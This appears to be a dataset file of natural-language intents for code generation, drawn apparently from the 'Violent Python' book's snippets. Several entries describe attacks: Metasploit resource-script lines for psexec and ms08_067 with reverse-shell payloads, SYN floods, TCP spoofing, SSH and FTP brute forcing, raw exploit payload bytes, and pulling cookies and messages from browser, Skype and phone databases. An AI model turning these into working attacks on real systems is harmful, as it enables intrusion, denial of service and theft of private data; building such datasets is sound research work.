@@ -1,0 +1,58 @@
+Scan the tgtHost on tgtPort with nmap and calculate the state
+Define the function addClient with arguments host, user and password then Call the class Client with argumet host, user and password and assign it to client then Call the method append on botNet with argument client
+Given an url get the html code
+Scan the subnet for the open port 445, then for each host if the port is open append it to a list and return it
+Given an url look for any other url inside the page
+Given an url and a userAgent address get the html code through that userAgent
+Connect with protocol ssx
+Given an url get the html code and the cookies
+Connect to placesDB database and execute the command "select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;"
+Given a src, tgt and ack send syn and ack packets to tgt with source port 513 and destination port 514
+Find download URIs given a pcap file
+Connect to downloadDB database and execute the command 'SELECT host, name, value FROM moz_cookies'
+Given a search_term,  get the list of urls from the ajax google api
+Given a string, search it on google ajax apis and return a json
+Given a string, make a google research with the ajax apis and get the response
+Define the function __init__ with arguments self and handle, assign to handle of self handle and assign to tweets of self the result of the method get_tweets with no argument of self
+Get a list of tweet given an handle
+For each tweet find the links, the users and the hashtags associated
+Given the file cityFile with a city in each line return the tweets that contain that city
+Given cityFile, open the file and return a list of city stripped of '\n' and '\r' in lower case
+Given a list of tweets and a list of cities associate the city to the geo location of the tweet
+Given an handle get who wrote, the location and tweet through an anonymous browser
+Assign self,first_name,last_name, job and social_media= to self
+Define the method __repr__  with argument self and return the concatenation of first_name of self, ' ', last_name of self + ' has job ' + job of self
+Return the variable social_media with key media_nameof self if it exists
+Given a query return a list of tweets composed of the author, the geolocalization and the text in the tweet
+Given an user, pwd, to, subject and text try to send an email
+Define the method __init__ with arguments self, title, text and url, assign to title of self the value title, assign to text of self the value text and assign to text of self the value text 
+Define the function send_command with arguments child and cmd, call method sendline with argument cmd of child and call method expect with argument PROMPT of child
+Send a packet pkt with source src, destination dst, UDP with destination port equals to 518 and the load equals to "\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8" and send a packet pkt with source src, destination dst, UDP with destination port equals to 635 and the load equals to "^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F"
+For each password in the file pF remove the '\n' and '\r' then write in the file: 'use exploit/windows/smb/psexec\n', 'set SMBUser ' + str(username) + '\n', 'set SMBPass ' + str(password) + '\n', 'set RHOST ' + str(tgtHost) + '\n', 'set payload '+'windows/meterpreter/reverse_tcp\n', 'set LPORT ' + str(lport) + '\n' and 'set LHOST ' + lhost + '\n' and 'exploit -j -z\n'
+Write a configFile with the lines: 'use exploit/multi/handler\n', 'set payload '+'windows/meterpreter/reverse_tcp\n', 'set LPORT ' + str(lport) + '\n', 'set LHOST ' + lhost + '\n', 'exploit -j -z\n' and 'setg DisablePayloadHandler 1\n'
+Costruct the class with host, user and password, then connect
+Flood a tgt with syn requests given a src for each source port from 1024 to 65535
+Connect to downloadDB database and execute the command 'SELECT name, source, datetime(endTime/1000000,\'unixepoch\') FROM moz_downloads;'
+Check if the images contain Exif data, if it does then for each tuple tag and value in it decode it
+Get the default pages from a FTP connection with the command nlst, return if failed else for each page return the one that contains .php .htm or .asp
+Connect to the database iphoneDB, run the command 'SELECT tbl_name FROM sqlite_master WHERE type==\"table\";', return True if you find the substring 'message', False if you find an error
+Given a pcap get in tcp data the number of entries composed of ip source, ':', ip destination with destination port 80
+Attempt to connect with user to the host with a keyfile and check if connection must be released
+Given an url and a dir save in a dir every image found on the url
+Attempt a brute force connection with an hostname and a file containing the username and the password separated by : at each line every second. Return the tuple userName and password if successful
+Get Keyhole Markup Language given an ip
+Connect to the host with user and password with protocol ssh, exit if you cant insert the password or it is wrong
+Find all the images from a url and return them
+Get the image from imgTag, download it into a file and return it
+Connect to placesDB database and execute the command  "select url, datetime(visit_date/1000000,  'unixepoch') from moz_places, moz_historyvisits where visit_count > 0 and moz_places.id==moz_historyvisits.place_id;". Find all google url in lower case, split for '&' and replace 'q=' and '+'
+Connect to the database skypeDB and execute the command "SELECT datetime(timestamp,'unixepoch'),dialog_partner, author, body_xml FROM Messages;" then define if the messages are sent or received
+Attempt an anonymous connection with FTP protocol given an hostname. Return true if succesful False otherwise
+Send the message ViolentPython\r\n on the host tgtHost on the port tgtPort
+Send the command cmd
+Connect to the database msgDB, run the command'select datetime(date,\'unixepoch\'),address, text from message WHERE address>0;', then get date, addr and text for each row
+Connect to a  host with user and password with the ssh protocol
+For all entries in pcap get the source or the destination of the IP packet
+Given a pkt, extract the IP and test the time to live
+Get a string composed of country and city if it exists given an IP, expect return 'Unregistered'
+Write a configFile with the lines: 'use exploit/windows/smb/ms08_067_netapi\n', 'set RHOST ' + str(tgtHost) + '\n', 'set payload '+'windows/meterpreter/reverse_tcp\n', 'set LPORT ' + str(lport) + '\n', 'set LHOST ' + lhost + '\n' and 'exploit -j -z\n'
+Connect to host with user and password with ssh protocol and stop after "release" failures
